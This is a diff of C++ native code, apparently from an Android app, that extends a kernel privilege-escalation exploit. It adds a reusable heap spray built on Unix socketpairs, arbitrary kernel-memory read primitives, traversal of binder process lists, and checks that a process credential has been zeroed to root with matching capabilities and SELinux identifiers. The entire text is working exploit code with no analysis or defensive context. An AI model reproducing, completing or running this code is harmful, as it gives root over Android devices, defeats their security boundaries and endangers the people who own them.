-        g_fake_control_active || payload == nullptr ||
-        (staged_limit != kFakeControlStagedCount &&
+        g_fake_control_active || payload == nullptr || spray_count <= 0 ||
+        spray_count > kFakeControlSlotCount ||
+        (!grouped && staged_limit != kFakeControlStagedCount &&
+         staged_limit != kFakeControlInitialStagedCount &&
          staged_limit != kFakeControlReplacementStagedCount)) {
         return false;
     }
@@ -1820,12 +2250,15 @@ bool prepare_fake_control_spray(const std::uint8_t* payload,
     }
     g_fake_control_gate.store(0, std::memory_order_relaxed);
     g_fake_control_staged_gate.store(0, std::memory_order_relaxed);
+    int slot_limit = grouped || reusable
+            ? kFakeControlSlotCount : spray_count;
     int eligible = 0;
-    for (const auto& slot : g_fake_control_slots) {
-        eligible += !slot.poisoned ? 1 : 0;
+    for (int index = 0; index < slot_limit; ++index) {
+        eligible += !g_fake_control_slots[index].poisoned ? 1 : 0;
     }
     g_fake_control_staged_limit = staged_limit;
     g_fake_control_staged_expected = std::min(staged_limit, eligible);
+    g_fake_control_write_batch = grouped;
     g_fake_control_active = true;
     g_fake_control_expected = 0;
     *prefilled_messages = 0;
@@ -1833,7 +2266,11 @@ bool prepare_fake_control_spray(const std::uint8_t* payload,
     pthread_attr_t attributes;
     pthread_attr_init(&attributes);
     pthread_attr_setstacksize(&attributes, 32 * 1024);
-    for (int index = 0; index < kFakeControlSprayCount; ++index) {
+    for (int index = 0; index < slot_limit; ++index) {
+        if (reusable &&
+            g_fake_control_expected == kFakeControlSprayCount) {
+            break;
+        }
         if (g_terminal_fd_retirement_gate.load(
                     std::memory_order_acquire)) {
             pthread_attr_destroy(&attributes);
@@ -1844,13 +2281,24 @@ bool prepare_fake_control_spray(const std::uint8_t* payload,
         if (slot.poisoned) {
             continue;
         }
+        bool existing_reusable = reusable && slot.created &&
+                slot.reusable_worker && slot.pair[0] >= 0 &&
+                slot.pair[1] >= 0 &&
+                slot.state.load(std::memory_order_acquire) == 0;
+        int eligible_index = g_fake_control_expected;
+        int activation_group = grouped &&
+                eligible_index < kFakeControlWriteBatchStagedCount
+                ? eligible_index / grouped_payload_size + 1 : 0;
         slot.staged.store(g_fake_control_expected <
                         g_fake_control_staged_expected,
                 std::memory_order_release);
         slot.staged_generation = slot.staged.load(
                 std::memory_order_acquire) ?
                 g_fake_control_staged_generation : 0;
-        std::memcpy(slot.payload, payload, sizeof(slot.payload));
+        slot.activation_group = activation_group;
+        const std::uint8_t* selected_payload = activation_group > 0
+                ? grouped_payloads[activation_group - 1] : payload;
+        std::memcpy(slot.payload, selected_payload, sizeof(slot.payload));
         if (indexed) {
             std::uint64_t pointer = kIndexedPtrBase |
                     static_cast<std::uint32_t>(index);
@@ -1859,22 +2307,32 @@ bool prepare_fake_control_spray(const std::uint8_t* payload,
             std::memcpy(slot.payload + 88, &pointer, sizeof(pointer));
             std::memcpy(slot.payload + 96, &cookie, sizeof(cookie));
         }
-        slot.state.store(0, std::memory_order_relaxed);
+        if (!existing_reusable) {
+            slot.state.store(0, std::memory_order_relaxed);
+        }
         slot.activation.store(0, std::memory_order_relaxed);
         slot.rearm_requested.store(false, std::memory_order_relaxed);
         slot.result = -1;
         slot.rearm_result = -1;
         slot.saved_errno = 0;
         slot.rearm_errno = 0;
-        slot.tid = -1;
         int send_buffer = 4096;
-        if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC,
-                       0, slot.pair) != 0 ||
-            setsockopt(slot.pair[0], SOL_SOCKET, SO_SNDBUF,
-                       &send_buffer, sizeof(send_buffer)) != 0) {
+        if (reusable && slot.created && !existing_reusable) {
             pthread_attr_destroy(&attributes);
             release_fake_control_spray_locked();
             return false;
+        }
+        if (!existing_reusable &&
+            (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC,
+                        0, slot.pair) != 0 ||
+             setsockopt(slot.pair[0], SOL_SOCKET, SO_SNDBUF,
+                        &send_buffer, sizeof(send_buffer)) != 0)) {
+            pthread_attr_destroy(&attributes);
+            release_fake_control_spray_locked();
+            return false;
+        }
+        if (!existing_reusable) {
+            slot.tid = -1;
         }
         iovec vector {};
         vector.iov_base = slot.payload;
@@ -1887,16 +2345,35 @@ bool prepare_fake_control_spray(const std::uint8_t* payload,
                        MSG_DONTWAIT | MSG_NOSIGNAL) > 0) {
             ++filled;
         }
+        bool worker_ready = filled > 0 &&
+                (errno == EAGAIN || errno == EWOULDBLOCK);
+        if (worker_ready && reusable && !existing_reusable) {
+            slot.reusable_worker = true;
+            slot.reusable_stop.store(false, std::memory_order_release);
+            slot.reusable_cycle.store(0, std::memory_order_relaxed);
+            slot.reusable_completed.store(0, std::memory_order_relaxed);
+            worker_ready = pthread_create(
+                    &slot.thread, &attributes,
+                    run_reusable_fake_control_sender, &slot) == 0;
+            slot.created = worker_ready;
+        } else if (worker_ready && !reusable) {
+            worker_ready = pthread_create(
+                    &slot.thread, &attributes,
+                    run_fake_control_sender, &slot) == 0;
+            slot.created = worker_ready;
+        }
         if (g_terminal_fd_retirement_gate.load(
-                    std::memory_order_acquire) ||
-            filled == 0 || (errno != EAGAIN && errno != EWOULDBLOCK) ||
-            pthread_create(&slot.thread, &attributes,
-                           run_fake_control_sender, &slot) != 0) {
+                    std::memory_order_acquire) || !worker_ready) {
             pthread_attr_destroy(&attributes);
             release_fake_control_spray_locked();
             return false;
         }
-        slot.created = true;
+        if (reusable) {
+            int cycle = static_cast<int>(g_fake_control_generation);
+            slot.reusable_cycle.store(cycle, std::memory_order_release);
+            syscall(SYS_futex, &slot.reusable_cycle,
+                    FUTEX_WAKE_PRIVATE, 1, nullptr, nullptr, 0);
+        }
         ++g_fake_control_expected;
         *prefilled_messages += filled;
     }
@@ -1904,7 +2381,11 @@ bool prepare_fake_control_spray(const std::uint8_t* payload,
     for (int attempt = 0; attempt < 2000; ++attempt) {
         int ready = 0;
         for (auto& slot : g_fake_control_slots) {
-            ready += !slot.poisoned && slot.created &&
+            bool current_cycle = !reusable ||
+                    (slot.reusable_worker &&
+                    slot.reusable_cycle.load(std::memory_order_acquire) ==
+                            static_cast<int>(g_fake_control_generation));
+            ready += !slot.poisoned && slot.created && current_cycle &&
                     slot.state.load(std::memory_order_acquire) == 1;
         }
         if (ready == g_fake_control_expected && ready > 0 &&
@@ -1925,7 +2406,7 @@ bool prepare_fake_control_spray(const std::uint8_t* payload,
 
 int activate_fake_control_spray() {
     std::lock_guard<std::mutex> lock(g_fake_control_mutex);
-    if (!g_fake_control_active) {
+    if (!g_fake_control_active || g_fake_control_write_batch) {
         return 0;
     }
     if (g_terminal_fd_retirement_gate.load(std::memory_order_acquire)) {
@@ -2024,7 +2505,7 @@ int activate_fake_control_spray() {
         release_fake_control_spray_locked();
         return 0;
     }
-    usleep(200000);
+    usleep(20000);
     int blocked = 0;
     for (auto& slot : g_fake_control_slots) {
         if (slot.poisoned || !slot.created) {
@@ -2035,12 +2516,118 @@ int activate_fake_control_spray() {
     return blocked;
 }
 
+int activate_fake_control_write_group(int group) {
+    std::lock_guard<std::mutex> lock(g_fake_control_mutex);
+    if (!g_fake_control_active || !g_fake_control_write_batch ||
+        group <= 0 || group > kFakeControlWriteBatchCount ||
+        g_fake_control_staged_expected !=
+                kFakeControlWriteBatchStagedCount) {
+        return 0;
+    }
+    int expected = 0;
+    for (auto& slot : g_fake_control_slots) {
+        if (!slot.poisoned && slot.created &&
+            slot.activation_group == group) {
+            ++expected;
+        }
+    }
+    if (expected != kFakeControlWriteBatchGroupSize) {
+        return 0;
+    }
+    int staged = 0;
+    for (auto& slot : g_fake_control_slots) {
+        if (!slot.poisoned && slot.created &&
+                slot.activation_group == group &&
+                staged < kFakeControlStagedCount) {
+            ++staged;
+            slot.activation.store(1, std::memory_order_release);
+            syscall(SYS_futex, &slot.activation, FUTEX_WAKE_PRIVATE, 1,
+                    nullptr, nullptr, 0);
+        }
+    }
+    if (staged != kFakeControlStagedCount) {
+        return 0;
+    }
+    bool staged_blocked = false;
+    for (int attempt = 0; attempt < 2000; ++attempt) {
+        int entered = 0;
+        bool invalid = false;
+        int ordinal = 0;
+        for (const auto& slot : g_fake_control_slots) {
+            if (slot.poisoned || !slot.created ||
+                slot.activation_group != group) {
+                continue;
+            }
+            int state = slot.state.load(std::memory_order_acquire);
+            if (ordinal++ < kFakeControlStagedCount) {
+                entered += state == 2 ? 1 : 0;
+                invalid = invalid || state >= 3;
+            }
+        }
+        if (entered == kFakeControlStagedCount) {
+            staged_blocked = true;
+            break;
+        }
+        if (invalid || g_terminal_fd_retirement_gate.load(
+                    std::memory_order_acquire)) {
+            return 0;
+        }
+        usleep(1000);
+    }
+    if (!staged_blocked) {
+        return 0;
+    }
+    usleep(1000);
+    int ordinal = 0;
+    for (auto& slot : g_fake_control_slots) {
+        if (slot.poisoned || !slot.created ||
+                slot.activation_group != group) {
+            continue;
+        }
+        if (ordinal++ >= kFakeControlStagedCount) {
+            slot.activation.store(1, std::memory_order_release);
+            syscall(SYS_futex, &slot.activation, FUTEX_WAKE_PRIVATE, 1,
+                    nullptr, nullptr, 0);
+        }
+    }
+    for (int attempt = 0; attempt < 2000; ++attempt) {
+        int entered = 0;
+        bool invalid = false;
+        for (const auto& slot : g_fake_control_slots) {
+            if (slot.poisoned || !slot.created ||
+                    slot.activation_group != group) {
+                continue;
+            }
+            int state = slot.state.load(std::memory_order_acquire);
+            entered += state == 2 ? 1 : 0;
+            invalid = invalid || state >= 3;
+        }
+        if (entered == expected) {
+            usleep(200000);
+            int stable = 0;
+            for (const auto& slot : g_fake_control_slots) {
+                stable += !slot.poisoned && slot.created &&
+                        slot.activation_group == group &&
+                        slot.state.load(std::memory_order_acquire) == 2
+                        ? 1 : 0;
+            }
+            return stable == expected ? entered : 0;
+        }
+        if (invalid || g_terminal_fd_retirement_gate.load(
+                    std::memory_order_acquire)) {
+            return 0;
+        }
+        usleep(1000);
+    }
+    return 0;
+}
+
 int retain_poisoned_control(int selected_index, int victim) {
     std::lock_guard<std::mutex> lock(g_fake_control_mutex);
     if (g_terminal_fd_retirement_gate.load(
                 std::memory_order_acquire) ||
         !g_fake_control_active || selected_index < 0 ||
-        selected_index >= kFakeControlSprayCount ||
+        selected_index >= kFakeControlSlotCount ||
         victim < 0 || victim >= kRawVictimCount ||
         g_fake_control_slots[selected_index].poisoned ||
         g_fake_control_slots[selected_index].state.load(
@@ -2095,6 +2682,47 @@ void record_terminal_cleanup_stage(const char* stage) {
     }
 }
 
+bool shutdown_reusable_fake_control_pool_locked() {
+    for (auto& slot : g_fake_control_slots) {
+        if (!slot.reusable_worker || slot.poisoned) {
+            continue;
+        }
+        if (!slot.created || slot.pair[0] < 0 || slot.pair[1] < 0 ||
+            slot.state.load(std::memory_order_acquire) != 0) {
+            return false;
+        }
+        slot.reusable_stop.store(true, std::memory_order_release);
+        slot.reusable_cycle.store(-1, std::memory_order_release);
+        syscall(SYS_futex, &slot.reusable_cycle,
+                FUTEX_WAKE_PRIVATE, 1, nullptr, nullptr, 0);
+        bool stopped = false;
+        for (int attempt = 0; attempt < 20000; ++attempt) {
+            if (slot.state.load(std::memory_order_acquire) == 3) {
+                stopped = true;
+                break;
+            }
+            usleep(50);
+        }
+        if (!stopped || pthread_join(slot.thread, nullptr) != 0 ||
+            !close_owned_fd(slot.pair[0]) ||
+            !close_owned_fd(slot.pair[1])) {
+            return false;
+        }
+        slot.pair[0] = -1;
+        slot.pair[1] = -1;
+        slot.created = false;
+        slot.reusable_worker = false;
+        slot.reusable_stop.store(false, std::memory_order_relaxed);
+        slot.reusable_cycle.store(0, std::memory_order_relaxed);
+        slot.reusable_completed.store(0, std::memory_order_relaxed);
+        slot.staged.store(false, std::memory_order_relaxed);
+        slot.staged_generation = 0;
+        slot.tid = -1;
+        slot.state.store(0, std::memory_order_relaxed);
+    }
+    return true;
+}
+
 int release_poisoned_control_locked() {
     record_terminal_cleanup_stage("spray-release-start");
     if (!g_terminal_ctlbuf_repair_verified) {
@@ -2128,6 +2756,9 @@ int release_poisoned_control_locked() {
             slot.pair[0] < 0 || slot.pair[1] < 0 || !slot.created) {
             return -1;
         }
+        if (slot.reusable_worker) {
+            slot.reusable_stop.store(true, std::memory_order_release);
+        }
         shutdown(slot.pair[1], SHUT_RDWR);
         if (!close_owned_fd(slot.pair[1])) {
             return -1;
@@ -2151,6 +2782,7 @@ int release_poisoned_control_locked() {
             return -1;
         }
         slot.created = false;
+        slot.reusable_worker = false;
         if (!close_owned_fd(slot.pair[0])) {
             return -1;
         }
@@ -2159,6 +2791,7 @@ int release_poisoned_control_locked() {
         slot.staged_generation = 0;
         slot.rearm_requested.store(false, std::memory_order_relaxed);
         slot.activation.store(0, std::memory_order_relaxed);
+        slot.activation_group = 0;
         int victim = slot.poison_victim;
         slot.poisoned = false;
         slot.poison_victim = -1;
@@ -2172,6 +2805,10 @@ int release_poisoned_control_locked() {
     if (released > 0 && g_raw_victim0_canonical_original) {
         g_raw_victim0_canonical_original = false;
         g_raw_arbitrary_rearm_worker = -1;
+    }
+    if (!shutdown_reusable_fake_control_pool_locked()) {
+        record_terminal_cleanup_stage("spray-reusable-release-failed");
+        return -1;
     }
     record_terminal_cleanup_stage("spray-joins-finished");
     return released;
@@ -2280,19 +2917,11 @@ std::uint32_t g_zero_snapshot_sid = 0;
 std::uint64_t g_zero_snapshot_final_header = 0;
 int g_live_security_target_stage = 0;
 
-bool arbitrary_read32_allow_zero(
-        std::uint64_t address, std::uint64_t control_address,
-        std::uint64_t expected_control, std::uint32_t* value) {
+bool arbitrary_read32_allow_zero_unchecked(
+        std::uint64_t address, std::uint32_t* value) {
     if (!g_arb_read_ready || g_selected_epoll_fd < 0 || value == nullptr ||
-        address < 24 || control_address < 24 || g_arb_file_fd < 0 ||
-        g_selected_epoll_watched_fd < 0 ||
-        !kernel_pointer(expected_control) ||
-        static_cast<std::uint32_t>(expected_control) == 0) {
-        return false;
-    }
-    std::uint64_t before = 0;
-    if (!reliable_read64(control_address, &before) ||
-        before != expected_control) {
+        address < 24 || g_arb_file_fd < 0 ||
+        g_selected_epoll_watched_fd < 0) {
         return false;
     }
     int result = 0;
@@ -2306,10 +2935,7 @@ bool arbitrary_read32_allow_zero(
     g_zero_read_address = address;
     g_zero_read_result = ioctl_result;
     g_zero_read_errno = read_errno;
-    std::uint64_t after = 0;
-    bool control_valid = reliable_read64(control_address, &after) &&
-            after == expected_control;
-    if (!positioned || !control_valid ||
+    if (!positioned ||
         (ioctl_result != 0 &&
          !(ioctl_result == -1 && read_errno == EINVAL))) {
         return false;
@@ -2320,17 +2946,36 @@ bool arbitrary_read32_allow_zero(
     return true;
 }
 
+bool arbitrary_read64_allow_zero_unchecked(
+        std::uint64_t address, std::uint64_t* value) {
+    std::uint32_t low = 0;
+    std::uint32_t high = 0;
+    if (value == nullptr ||
+        !arbitrary_read32_allow_zero_unchecked(address, &low) ||
+        !arbitrary_read32_allow_zero_unchecked(address + 4, &high)) {
+        return false;
+    }
+    *value = low | (static_cast<std::uint64_t>(high) << 32U);
+    return true;
+}
+
 bool reliable_read64_allow_zero(
         std::uint64_t address, std::uint64_t control_address,
         std::uint64_t expected_control, std::uint64_t* value) {
     for (int attempt = 0; attempt < 4; ++attempt) {
+        std::uint64_t before = 0;
+        std::uint64_t middle = 0;
+        std::uint64_t after = 0;
         std::uint32_t low = 0;
         std::uint32_t high = 0;
-        if (arbitrary_read32_allow_zero(
-                    address, control_address, expected_control, &low) &&
-            arbitrary_read32_allow_zero(
-                    address + 4, control_address,
-                    expected_control, &high)) {
+        if (reliable_read64(control_address, &before) &&
+            before == expected_control &&
+            arbitrary_read32_allow_zero_unchecked(address, &low) &&
+            reliable_read64(control_address, &middle) &&
+            middle == expected_control &&
+            arbitrary_read32_allow_zero_unchecked(address + 4, &high) &&
+            reliable_read64(control_address, &after) &&
+            after == expected_control) {
             *value = low | (static_cast<std::uint64_t>(high) << 32U);
             return true;
         }
@@ -2338,7 +2983,7 @@ bool reliable_read64_allow_zero(
     return false;
 }
 
-bool read_credential_snapshot(
+bool read_credential_snapshot_fast(
         std::uint64_t cred, std::uint64_t cred_slot,
         std::uint64_t snapshot[kCredentialSnapshotWords],
         std::uint32_t* sid) {
@@ -2346,16 +2991,25 @@ bool read_credential_snapshot(
         snapshot == nullptr || sid == nullptr) {
         return false;
     }
+    std::uint64_t control = 0;
+    if (!reliable_read64(cred_slot, &control) || control != cred) {
+        return false;
+    }
     for (int index = 0; index < kCredentialSnapshotWords; ++index) {
-        if (!reliable_read64_allow_zero(
+        if (!arbitrary_read64_allow_zero_unchecked(
                     cred + static_cast<std::uint64_t>(index) * 8,
-                    cred_slot, cred, &snapshot[index])) {
+                    &snapshot[index])) {
+            return false;
+        }
+        if (index == kCredentialSnapshotWords / 2 &&
+            (!reliable_read64(cred_slot, &control) || control != cred)) {
             return false;
         }
     }
     std::uint64_t security = snapshot[15];
     return kernel_pointer(security) &&
-            reliable_read32(security + 4, sid);
+            reliable_read32(security + 4, sid) &&
+            reliable_read64(cred_slot, &control) && control == cred;
 }
 
 bool shell_credential_snapshot_valid(
@@ -2512,6 +3166,153 @@ bool validate_zero_root_cred_snapshot(
     return true;
 }
 
+bool validate_zero_root_cred_snapshot_fast(
+        std::uint64_t task, std::uint64_t cred,
+        std::uint64_t real_cred_slot, std::uint64_t cred_slot,
+        std::uint64_t expected_security, std::uint32_t expected_sid,
+        std::uint64_t* repair_value) {
+    if (!kernel_pointer(task) || !kernel_pointer(cred) ||
+        !kernel_pointer(expected_security) || expected_sid == 0 ||
+        real_cred_slot < task || real_cred_slot + 16 > task + 0x3000 ||
+        cred_slot != real_cred_slot + 8 || repair_value == nullptr) {
+        return false;
+    }
+    g_zero_snapshot_stage = 1;
+    g_zero_snapshot_header = 0;
+    g_zero_snapshot_id_index = -1;
+    g_zero_snapshot_id_value = 0;
+    g_zero_snapshot_repair = UINT64_MAX;
+    g_zero_snapshot_security = 0;
+    g_zero_snapshot_sid = 0;
+    g_zero_snapshot_final_header = 0;
+    std::uint64_t real_before = 0;
+    std::uint64_t cred_before = 0;
+    std::uint64_t header = 0;
+    std::uint64_t ids[4] {};
+    std::uint64_t repair = UINT64_MAX;
+    std::uint64_t effective_caps = 0;
+    std::uint64_t security = 0;
+    std::uint32_t sid = 0;
+    std::uint64_t middle_cred = 0;
+    std::uint64_t real_after = 0;
+    std::uint64_t cred_after = 0;
+    std::uint64_t final_header = 0;
+    if (!reliable_read64(real_cred_slot, &real_before) ||
+        real_before != cred) {
+        return false;
+    }
+    g_zero_snapshot_stage = 2;
+    if (!reliable_read64(cred_slot, &cred_before) ||
+        cred_before != cred) {
+        return false;
+    }
+    g_zero_snapshot_stage = 3;
+    if (!arbitrary_read64_allow_zero_unchecked(cred, &header)) {
+        return false;
+    }
+    g_zero_snapshot_header = header;
+    std::uint32_t usage = static_cast<std::uint32_t>(header);
+    std::uint32_t uid = static_cast<std::uint32_t>(header >> 32U);
+    g_zero_snapshot_stage = 4;
+    if (usage < 16 || usage > 4096 || uid != 0) {
+        return false;
+    }
+    for (int index = 0; index < 4; ++index) {
+        g_zero_snapshot_stage = 5 + index;
+        g_zero_snapshot_id_index = index;
+        if (!arbitrary_read64_allow_zero_unchecked(
+                    cred + 4 + index * 8, &ids[index])) {
+            return false;
+        }
+        g_zero_snapshot_id_value = ids[index];
+        if (ids[index] != 0) {
+            return false;
+        }
+    }
+    g_zero_snapshot_stage = 9;
+    if (!arbitrary_read64_allow_zero_unchecked(cred + 8, &repair)) {
+        return false;
+    }
+    g_zero_snapshot_repair = repair;
+    if (repair != 0) {
+        return false;
+    }
+    if (!reliable_read64(cred_slot, &middle_cred) ||
+        middle_cred != cred) {
+        return false;
+    }
+    g_zero_snapshot_stage = 10;
+    if (!arbitrary_read64_allow_zero_unchecked(
+                cred + 56, &effective_caps) ||
+        effective_caps == 0 ||
+        effective_caps != g_security_target_cred_caps) {
+        return false;
+    }
+    if (!reliable_read64(cred + kCredSecurityOffset, &security)) {
+        return false;
+    }
+    g_zero_snapshot_security = security;
+    if (security != expected_security) {
+        return false;
+    }
+    g_zero_snapshot_stage = 11;
+    if (!reliable_read32(security + 4, &sid)) {
+        return false;
+    }
+    g_zero_snapshot_sid = sid;
+    if (sid != expected_sid) {
+        return false;
+    }
+    g_zero_snapshot_stage = 12;
+    if (!reliable_read64(real_cred_slot, &real_after) ||
+        real_after != cred) {
+        return false;
+    }
+    g_zero_snapshot_stage = 13;
+    if (!reliable_read64(cred_slot, &cred_after) ||
+        cred_after != cred) {
+        return false;
+    }
+    g_zero_snapshot_stage = 14;
+    if (!arbitrary_read64_allow_zero_unchecked(cred, &final_header)) {
+        return false;
+    }
+    g_zero_snapshot_final_header = final_header;
+    if (final_header != header) {
+        return false;
+    }
+    g_zero_snapshot_stage = 15;
+    *repair_value = repair;
+    return true;
+}
+
+bool validate_zero_identity_fields_fast(
+        std::uint64_t cred, std::uint64_t cred_slot,
+        std::uint32_t expected_usage) {
+    std::uint64_t control_before = 0;
+    std::uint64_t header = 0;
+    std::uint32_t sgid = UINT32_MAX;
+    std::uint64_t effective_ids = UINT64_MAX;
+    std::uint64_t fs_ids = UINT64_MAX;
+    std::uint64_t control_after = 0;
+    std::uint64_t final_header = 0;
+    return reliable_read64(cred_slot, &control_before) &&
+            control_before == cred &&
+            arbitrary_read64_allow_zero_unchecked(cred, &header) &&
+            static_cast<std::uint32_t>(header) == expected_usage &&
+            static_cast<std::uint32_t>(header >> 32U) == 0 &&
+            arbitrary_read32_allow_zero_unchecked(
+                    cred + 16, &sgid) && sgid == 0 &&
+            arbitrary_read64_allow_zero_unchecked(
+                    cred + 20, &effective_ids) && effective_ids == 0 &&
+            arbitrary_read64_allow_zero_unchecked(
+                    cred + 28, &fs_ids) && fs_ids == 0 &&
+            reliable_read64(cred_slot, &control_after) &&
+            control_after == cred &&
+            arbitrary_read64_allow_zero_unchecked(
+                    cred, &final_header) && final_header == header;
+}
+
 bool validate_live_security_target(bool cached_proc_only = false) {
     g_live_security_target_stage = 0;
     std::uint64_t target_proc = cached_proc_only
@@ -2594,6 +3395,27 @@ bool find_cred_slots(std::uint64_t task, std::uint64_t cred,
     return false;
 }
 
+bool validate_fixed_cred_slots(std::uint64_t task, std::uint64_t cred,
+                               std::uint64_t* real_cred_slot,
+                               std::uint64_t* cred_slot) {
+    if (!kernel_pointer(task) || !kernel_pointer(cred) ||
+        real_cred_slot == nullptr || cred_slot == nullptr) {
+        return false;
+    }
+    std::uint64_t real_cred = 0;
+    std::uint64_t subjective_cred = 0;
+    std::uint64_t real_slot = task + kTaskRealCredOffset;
+    std::uint64_t subjective_slot = task + kTaskCredOffset;
+    if (!reliable_read64(real_slot, &real_cred) || real_cred != cred ||
+        !reliable_read64(subjective_slot, &subjective_cred) ||
+        subjective_cred != cred) {
+        return false;
+    }
+    *real_cred_slot = real_slot;
+    *cred_slot = subjective_slot;
+    return true;
+}
+
 bool validate_init_cred(std::uint64_t address, std::uint32_t* usage,
                         std::uint32_t* sid, std::uint64_t* effective_caps,
                         bool require_live_usage = true) {
@@ -2669,6 +3491,8 @@ bool derive_kernel_profile(std::uint64_t task, std::uint64_t* slide,
     return false;
 }
 
+std::uint64_t find_target_binder_proc(std::uint64_t proc, int handle);
+
 std::uint64_t find_current_binder_proc() {
     g_last_binder_probe_file = 0;
     g_last_binder_probe_fops = 0;
@@ -2682,6 +3506,7 @@ std::uint64_t find_current_binder_proc() {
     g_last_binder_probe_init_sid = 0;
     g_last_main_binder_proc = 0;
     g_last_binder_probe_anchor_proc = 0;
+    g_last_binder_probe_binder_head = 0;
     g_last_binder_probe_nodes = 0;
     g_last_binder_probe_marker_offset = -1;
     g_last_binder_probe_stage = 1;
@@ -2833,7 +3658,20 @@ std::uint64_t find_current_binder_proc() {
     // only older processes. This avoids racing short-lived clients at the
     // live global head.
     std::uint64_t cursor = 0;
+    std::uint64_t binder_head_address =
+            runtime_base + kBinderProcsOffset;
+    if (derived && kernel_address(binder_head_address) &&
+        reliable_read64(binder_head_address, &cursor) &&
+        kernel_pointer(cursor)) {
+        g_last_binder_probe_binder_head = cursor;
+        g_last_binder_probe_anchor_proc = cursor;
+    } else {
+        cursor = 0;
+    }
     for (std::uint64_t node : candidates) {
+        if (kernel_pointer(cursor)) {
+            break;
+        }
         std::uint64_t proc = 0;
         std::uint32_t pid = 0;
         std::uint64_t task = 0;
@@ -2857,19 +3695,36 @@ std::uint64_t find_current_binder_proc() {
     while (kernel_pointer(cursor) && visited.insert(cursor).second &&
            visited.size() <= 4096) {
         std::uint32_t pid = 0;
-        std::uint64_t task = 0;
-        std::uint64_t refs = 0;
         std::uint64_t next = 0;
-        bool valid = arbitrary_read32(cursor + 64, &pid) &&
-                reliable_read64(cursor + 72, &task) &&
-                kernel_pointer(task) &&
-                reliable_read64(cursor + 32, &refs) &&
-                (refs == 0 || kernel_pointer(refs));
-        if (valid && pid == static_cast<std::uint32_t>(getpid())) {
-            g_last_main_binder_proc = cursor;
-            g_last_binder_probe_marker_offset = 0;
-            g_last_binder_probe_stage = 6;
-            return cursor;
+        bool header_valid = arbitrary_read32(cursor + 64, &pid);
+        if (header_valid && pid == static_cast<std::uint32_t>(getpid())) {
+            bool target_bound = g_credential_target_handle > 0 &&
+                    g_credential_target_pid > 0;
+            std::uint64_t target_proc = target_bound
+                    ? find_target_binder_proc(
+                            cursor, g_credential_target_handle)
+                    : 0;
+            std::uint32_t target_pid = 0;
+            bool target_matches = !target_bound ||
+                    (kernel_pointer(target_proc) &&
+                     arbitrary_read32(target_proc + 64, &target_pid) &&
+                     target_pid == static_cast<std::uint32_t>(
+                             g_credential_target_pid));
+            if (target_matches) {
+                std::uint64_t task = 0;
+                std::uint64_t refs = 0;
+                bool structure_valid =
+                        reliable_read64(cursor + 72, &task) &&
+                        kernel_pointer(task) &&
+                        reliable_read64(cursor + 32, &refs) &&
+                        (refs == 0 || kernel_pointer(refs));
+                if (structure_valid) {
+                    g_last_main_binder_proc = cursor;
+                    g_last_binder_probe_marker_offset = 0;
+                    g_last_binder_probe_stage = 6;
+                    return cursor;
+                }
+            }
         }
         if (!reliable_read64(cursor, &next)) {
             break;
@@ -2892,11 +3747,12 @@ Java_com_vandam_prism_NativeBridge_probeCurrentBinderProc(
             "status=%s stage=current-binder-proc"
             " proc=0x%" PRIx64 " probe_stage=%d nodes=%d"
             " anchor_proc=0x%" PRIx64 " fops=0x%" PRIx64
-            " kernel_base=0x%" PRIx64,
+            " kernel_base=0x%" PRIx64 " binder_head=0x%" PRIx64,
             pass ? "pass" : "miss", current_proc,
             g_last_binder_probe_stage, g_last_binder_probe_nodes,
             g_last_binder_probe_anchor_proc, g_last_binder_probe_fops,
-            g_last_binder_probe_base);
+            g_last_binder_probe_base,
+            g_last_binder_probe_binder_head);
     return environment->NewStringUTF(state);
 }
 
@@ -2907,6 +3763,37 @@ std::uint64_t find_target_binder_proc(std::uint64_t proc, int handle) {
     if (!kernel_pointer(proc) || handle <= 0 ||
         !reliable_read64(proc + 32, &root) || !kernel_pointer(root)) {
         return 0;
+    }
+    std::uint64_t cursor = root;
+    std::set<std::uint64_t> ordered_visited;
+    while (kernel_pointer(cursor) && ordered_visited.size() < 64 &&
+           ordered_visited.insert(cursor).second && cursor >= 16) {
+        ++g_last_binder_ref_nodes;
+        std::uint64_t ref = cursor - 16;
+        std::uint32_t desc = 0;
+        if (!reliable_read32(ref + 4, &desc)) {
+            break;
+        }
+        if (desc == static_cast<std::uint32_t>(handle)) {
+            std::uint64_t node = 0;
+            std::uint64_t target_proc = 0;
+            if (reliable_read64(ref + 88, &node) &&
+                kernel_pointer(node) &&
+                reliable_read64(node + 56, &target_proc) &&
+                kernel_pointer(target_proc)) {
+                g_last_target_binder_proc = target_proc;
+                return target_proc;
+            }
+            break;
+        }
+        std::uint64_t next = 0;
+        std::uint64_t child_offset =
+                static_cast<std::uint32_t>(handle) < desc ? 16 : 8;
+        if (!reliable_read64(cursor + child_offset, &next) ||
+            (next != 0 && !kernel_pointer(next))) {
+            break;
+        }
+        cursor = next;
     }
     std::vector<std::uint64_t> pending {root};
     std::set<std::uint64_t> visited;
@@ -3152,6 +4039,57 @@ std::uint64_t find_raw_victim_node(int victim) {
             g_last_target_binder_proc = cursor;
             g_raw_target_proc = cursor;
             return node;
+        }
+    }
+    return 0;
+}
+
+std::uint64_t find_binder_proc_by_pid(
+        std::uint64_t origin, std::uint32_t target_pid) {
+    if (!kernel_pointer(origin) || target_pid == 0) {
+        return 0;
+    }
+    std::set<std::uint64_t> visited;
+    auto inspect = [&](std::uint64_t candidate) {
+        if (!kernel_pointer(candidate) ||
+            !visited.insert(candidate).second) {
+            return false;
+        }
+        std::uint32_t pid = 0;
+        if (!arbitrary_read32(candidate + 64, &pid) || pid != target_pid) {
+            return false;
+        }
+        std::uint64_t task = 0;
+        std::uint64_t nodes = 0;
+        return arbitrary_read64(candidate + 72, &task) &&
+                kernel_pointer(task) &&
+                arbitrary_read64(candidate + 24, &nodes) &&
+                kernel_pointer(nodes);
+    };
+
+    std::uint64_t cursor = origin;
+    while (kernel_pointer(cursor) && visited.size() < 4096) {
+        if (inspect(cursor)) {
+            return cursor;
+        }
+        std::uint64_t next = 0;
+        if (!arbitrary_read64(cursor, &next) ||
+            !kernel_pointer(next) || visited.count(next) != 0) {
+            break;
+        }
+        cursor = next;
+    }
+
+    cursor = origin;
+    while (kernel_pointer(cursor) && visited.size() < 4096) {
+        std::uint64_t previous = 0;
+        if (!arbitrary_read64(cursor + 8, &previous) ||
+            !kernel_pointer(previous) || visited.count(previous) != 0) {
+            break;
+        }
+        cursor = previous;
+        if (inspect(cursor)) {
+            return cursor;
         }
     }
     return 0;
@@ -3535,6 +4473,14 @@ struct CveResult {
